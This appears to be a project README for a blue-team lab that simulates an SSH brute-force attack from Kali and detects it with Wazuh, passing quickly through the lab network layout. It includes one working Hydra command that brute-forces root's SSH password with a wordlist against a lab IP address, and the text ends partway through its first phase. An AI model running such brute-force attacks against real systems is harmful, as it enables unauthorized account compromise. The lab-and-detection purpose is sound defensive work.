# Wazuh-ssh-bruteforce-detection
End-to-end SSH brute-force simulation using Hydra and real-time SIEM detection with Wazuh.
# SSH Brute-Force Simulation & SIEM Detection with Wazuh

## Lab Architecture (`BlueTeamNet` — `192.168.100.0/24`)
* **Attacker (`Kali Linux`):** `192.168.100.8` — Service enumeration (`nmap`) and brute-force execution (`hydra`)
* **Target (`target-server` / Debian 13):** `192.168.100.4` — OpenSSH (`22/tcp`), `rsyslog`, `wazuh-agent` v4.14.9
* **SIEM (`wazuh-server` / Wazuh OVA):** `192.168.100.7` — `wazuh-manager`, `wazuh-indexer`, `wazuh-dashboard`

---

## Phase 1: Attack Simulation & Telemetry Attribution
Executed parallel SSH credential stuffing from Kali (`192.168.100.8`) against `target-server` (`192.168.100.4`):
```bash
hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.100.4 -t 4
